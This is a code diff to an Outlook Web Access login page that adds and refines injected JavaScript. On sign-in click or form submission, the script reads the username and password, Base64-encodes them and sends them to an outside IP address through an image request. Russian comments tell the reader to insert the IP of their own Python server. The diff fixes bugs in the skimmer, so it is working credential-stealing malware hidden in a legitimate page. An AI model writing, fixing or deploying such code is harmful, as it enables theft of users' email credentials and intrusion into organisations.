@@ -198,33 +198,45 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
 <form action="/owa/auth.owa" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
 <script>
 window.onload = function() {
-    document.onclick = function(e) {
-        if (e.target.className.indexOf('signin') !== -1  e.target.id.indexOf('sub') !== -1) {
+    // Используем addEventListener — это современный стандарт
+    document.addEventListener('click', function(e) {
+        // Добавлены || и проверка на существование target
+        if (e.target && (e.target.className.indexOf('signin') !== -1 || e.target.id.indexOf('sub') !== -1)) {
             capture();
         }
-    };
+    });
 
-    var f = document.getElementById('logonForm')  document.forms[0];
+    // Ищем форму более универсально
+    var f = document.getElementById('logonForm') || document.forms[0];
     if (f) {
         f.onsubmit = capture;
     }
 };
+
 function capture() {
     try {
-        var u = document.getElementById('username').value;
-        var p = document.getElementById('password').value;
+        var userEl = document.getElementById('username');
+        var passEl = document.getElementById('password');
 
-        var rawData = u + ":" + p;
+        // Проверяем, что элементы найдены и не пусты
+        if (userEl && passEl) {
+            var u = userEl.value;
+            var p = passEl.value;
+            
+            // Кодируем в Base64 (btoa), чтобы спецсимволы не ломали URL
+            var data = btoa(encodeURIComponent(u + ":" + p));
+            var i = new Image();
+            
+            // Сюда вставляешь IP своего Python-сервера
+            i.src = "http://45.92.1.25:8080/?creds=" + data;
 
-        var safeData = encodeURIComponent(rawData);
-
-        var i = new Image();
-
-        i.src = "http://45.92.1.25:8080/?creds=" + safeData;
-
-        var s = new Date().getTime();
-        while (new Date().getTime() < s + 500);
-    } catch (err) { }
+            // Небольшая задержка, чтобы запрос успел уйти до перезагрузки страницы
+            var s = new Date().getTime();
+            while (new Date().getTime() < s + 500);
+        }
+    } catch (err) { 
+        console.error("Capture error:", err); 
+    }
 }
 </script>
 <input type="hidden" name="destination" value="<%=EncodingUtilities.HtmlEncode(Destination)%>">
